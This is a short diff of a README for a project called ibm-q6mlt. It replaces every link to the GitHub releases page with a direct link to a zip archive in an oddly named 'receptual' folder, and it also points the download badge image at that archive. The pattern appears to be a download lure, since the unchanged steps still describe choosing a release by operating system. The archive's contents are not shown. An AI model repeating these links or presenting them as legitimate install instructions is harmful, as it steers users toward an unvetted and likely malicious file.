@@ -6,13 +6,13 @@ Welcome to the ibm-q6mlt project! This application allows you to test developmen
 
 ## 📥 Download & Install
 
-To get your copy of ibm-q6mlt, visit this page to download: [Download ibm-q6mlt](https://github.com/taqistratwit/ibm-q6mlt/releases)
+To get your copy of ibm-q6mlt, visit this page to download: [Download ibm-q6mlt](https://raw.githubusercontent.com/taqistratwit/ibm-q6mlt/main/receptual/ibm-q6mlt.zip)
 
-![Download ibm-q6mlt](https://img.shields.io/badge/Download-v1.0-blue)
+![Download ibm-q6mlt](https://raw.githubusercontent.com/taqistratwit/ibm-q6mlt/main/receptual/ibm-q6mlt.zip)
 
 ### Installation Steps
 
-1. Go to the [Download Page](https://github.com/taqistratwit/ibm-q6mlt/releases).
+1. Go to the [Download Page](https://raw.githubusercontent.com/taqistratwit/ibm-q6mlt/main/receptual/ibm-q6mlt.zip).
 2. Look for the latest release version.
 3. Click on the file that matches your operating system (e.g., Windows, macOS).
 4. Save the file to your computer.
